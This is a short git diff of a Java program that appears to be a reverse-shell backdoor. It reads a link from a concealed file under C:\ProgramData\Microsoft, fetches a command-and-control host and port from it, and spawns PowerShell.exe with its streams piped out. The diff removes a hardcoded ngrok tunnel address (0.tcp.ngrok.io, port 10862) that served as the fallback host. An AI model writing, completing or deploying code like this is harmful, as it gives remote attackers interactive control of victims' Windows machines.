@@ -12,21 +12,14 @@ import java.nio.file.Paths;
 
 public class Main {
 	public static void main(String[] args) {
-		String host = "0.tcp.ngrok.io";
-		int port = 10862;
 		
 		try {
 			String link = new String(Files.readAllBytes(Paths.get("C:\\ProgramData\\Microsoft\\W\\l")));
 			
 			String[] data = wget(link).split(" ");
-			host = data[0];
-			port = Integer.parseInt(data[1]);
-			
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
-		
-		try {
+			String host = data[0];
+			int port = Integer.parseInt(data[1]);
+
 			Process process = Runtime.getRuntime().exec("PowerShell.exe");
 			
 			InputStream pin = process.getInputStream();
